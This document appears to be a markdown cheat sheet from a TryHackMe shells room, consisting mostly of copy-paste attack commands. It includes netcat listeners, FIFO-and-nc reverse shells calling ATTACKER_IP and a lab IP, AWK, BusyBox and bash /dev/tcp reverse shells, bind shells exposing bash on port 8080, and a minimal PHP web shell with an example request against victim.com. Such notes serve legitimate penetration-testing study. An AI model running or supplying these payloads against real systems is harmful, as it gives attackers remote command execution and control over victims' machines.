# Shells Overview — Cheat Sheet (THM)

> Quick commands and notes for reverse shells, bind shells, listeners, and web shells.

## Reverse shells

**Listener (attacker):**

```bash
nc -lvnp 443
```

Listens on TCP/443 and waits for the target to call back. 

**Generic “pipe” reverse shell (target → attacker):**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

Creates a FIFO, runs an interactive shell, pipes I/O through `nc` to your listener, and feeds output back into the FIFO for bi-directional comms. 

**Examples from the room:**

```bash
# Example payload shown in the notes
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.48.111.64 4444 >/tmp/f
```



**Other one-liners**

* **AWK reverse shell**

  ```bash
  awk 'BEGIN {s="/inet/tcp/0/ATTACKER_IP/443"; while(42){do{printf "shell>" |& s; s |& getline c; if(c){ while((c |& getline)>0) print $0 |& s; close(c)}} while(c!="exit"); close(s)}}' /dev/null
  ```

  Uses AWK’s TCP to call back to the attacker and shuttle command I/O. 
* **BusyBox reverse shell**

  ```bash
  busybox nc ATTACKER_IP 443 -e sh
  ```

  BusyBox’s `nc` connects and executes `/bin/sh`.

## Bind shells

**Set up bind shell on the target:**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Target listens on 0.0.0.0:8080 and exposes `bash` when a client connects. (Ports <1024 need root.)  

**Connect from attacker:**

```bash
nc -nv TARGET_IP 8080
```

Disable DNS (`-n`) and be verbose (`-v`) when connecting.

## Web shells

**What they are:** Scripts (PHP/ASP/JSP/CGI, etc.) executed by the web server to run OS commands on behalf of the attacker. 

**Minimal PHP web shell:**

```php
<?php
if (isset($_GET['cmd'])) { system($_GET['cmd']); }
?>
```

Upload (via file upload/LFI/command injection/etc.), then run:

```
http://victim.com/uploads/shell.php?cmd=whoami
```



**Popular PHP web shells:**

* p0wny-shell (single-file) — remote command exec. 
* b374k shell — file management + exec. 
* c99 shell — feature-rich. 
  (More collections at r57shell.)

## Quick workflow recap

1. **Reverse shell path:**

   * Start listener on attacker: `nc -lvnp 443`. 
   * Trigger reverse shell payload on target (bash/awk/busybox examples above).   
   * You should receive a shell back (see sample output). 

2. **Bind shell path:**

   * Start bind shell on the target (FIFO+`nc -l`). 
   * Connect from attacker: `nc -nv TARGET_IP 8080`.

## Handy snippets (copy/paste)

```bash
# Attacker reverse listener
nc -lvnp 4444

# Bash reverse (generic)
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'   # (alt style)

# FIFO reverse (from the notes)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 4444 >/tmp/f

# Bind shell (target)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f

# Attacker connect to bind
nc -nv TARGET_IP 8080
```
